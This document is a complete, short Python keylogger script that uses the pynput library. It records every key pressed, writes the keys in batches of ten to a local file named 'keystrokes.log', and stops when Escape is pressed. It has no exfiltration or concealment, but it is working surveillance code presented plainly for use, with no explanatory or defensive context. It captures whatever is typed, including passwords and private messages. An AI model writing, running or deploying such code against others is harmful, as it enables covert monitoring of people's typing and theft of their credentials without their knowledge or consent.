from pynput.keyboard import Key, Listener

# Global variables to store keystrokes and log file name
logged_keys = []
log_file = "keystrokes.log"

# Function to write logged keys to a file
def write_to_file(keys):
    with open(log_file, "a") as f:
        for key in keys:
            f.write(str(key))

# Function to handle key presses
def on_press(key):
    global logged_keys
    logged_keys.append(key)

    # Write keystrokes to the log file after every 10 keystrokes
    if len(logged_keys) >= 10:
        write_to_file(logged_keys)
        logged_keys = []

# Function to handle key releases
def on_release(key):
    # Exit the keylogger if the Escape key is pressed
    if key == Key.esc:
        write_to_file(logged_keys)
        return False

# Set up the listener for key presses and releases
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
